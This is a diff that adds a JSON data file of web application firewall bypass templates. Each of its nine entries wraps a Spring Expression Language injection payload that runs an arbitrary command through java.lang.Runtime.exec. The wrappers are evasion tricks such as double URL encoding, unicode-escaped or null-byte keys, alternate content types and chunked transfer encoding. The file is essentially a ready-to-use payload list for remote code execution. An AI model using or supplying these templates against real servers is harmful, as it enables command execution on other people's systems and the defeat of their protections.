@@ -1,0 +1,46 @@
+{
+  "_comment": "WAF structural bypass techniques. 'template' uses {cmd} as placeholder for the command.",
+  "bypasses": [
+    {
+      "name": "Double URL Encoding",
+      "template": "{\"query\": \"%257B%257BT%2528java.lang.Runtime%2529.getRuntime%2528%2529.exec%2528%2522{cmd}%2522%2529%257D%257D\"}"
+    },
+    {
+      "name": "Unicode Escape",
+      "template": "{\"qu\\u0065ry\": \"{{T(java.lang.Runtime).getRuntime().exec(\\\"{cmd}\\\")}}\"}",
+      "note": "Field name unicode-escaped to bypass string matching"
+    },
+    {
+      "name": "Mixed Case Key",
+      "template": "{\"Query\": \"{{T(java.lang.Runtime).getRuntime().exec(\\\"{cmd}\\\")}}\"}"
+    },
+    {
+      "name": "Null Byte Key",
+      "template": "{\"query\\x00\": \"{{T(java.lang.Runtime).getRuntime().exec(\\\"{cmd}\\\")}}\"}",
+      "note": "Null byte in JSON key — exploits lenient parsers"
+    },
+    {
+      "name": "Extra Whitespace",
+      "template": "{\n\t\"query\":\n\t\"{{T(java.lang.Runtime).getRuntime().exec(\\\"{cmd}\\\")}}\"\n}"
+    },
+    {
+      "name": "JSON Wrapped",
+      "template": "{\"data\":{\"query\":\"{{T(java.lang.Runtime).getRuntime().exec(\\\"{cmd}\\\")}}\"}}"
+    },
+    {
+      "name": "Form URL Encoded",
+      "template": "query=%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22{cmd}%22%29%7D%7D",
+      "content_type": "application/x-www-form-urlencoded"
+    },
+    {
+      "name": "XML Content-Type",
+      "template": "<query>{{T(java.lang.Runtime).getRuntime().exec(\"{cmd}\")}}</query>",
+      "content_type": "application/xml"
+    },
+    {
+      "name": "Chunked Encoding",
+      "template": "{\"query\": \"{{T(java.lang.Runtime).getRuntime().exec(\\\"{cmd}\\\")}}\"}",
+      "extra_headers": {"Transfer-Encoding": "chunked"}
+    }
+  ]
+}
